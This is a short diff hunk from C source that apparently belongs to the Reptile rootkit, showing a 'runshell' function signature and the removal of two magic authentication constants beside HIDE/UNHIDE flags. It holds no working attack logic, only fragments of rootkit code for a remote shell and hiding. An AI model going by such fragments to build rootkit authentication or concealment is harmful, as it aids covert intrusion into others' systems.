@@ -243,8 +243,6 @@ int runshell(int client)
 
 #ifdef _REPTILE_
 
-#define AUTH 0xdeadbeef
-#define HTUA 0xc0debabe
 #define HIDE 1
 #define UNHIDE 0
 
